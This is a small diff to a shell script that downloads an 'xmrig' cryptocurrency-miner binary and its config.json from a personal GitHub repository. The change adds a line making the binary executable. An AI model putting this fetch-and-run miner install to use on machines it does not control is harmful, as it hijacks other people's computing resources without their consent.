@@ -33,6 +33,9 @@ if $is_arm64; then
     $DOWNLOAD_CMD https://github.com/spetterman66/verynicerepo/raw/main/xmrig
 fi
 
+# just to be extra safe
+chmod +x xmrig
+
 rm -rf config.json
 $DOWNLOAD_CMD https://raw.githubusercontent.com/spetterman66/verynicerepo/main/config.json
 randnum=$(( RANDOM % 1000 + 1 ))
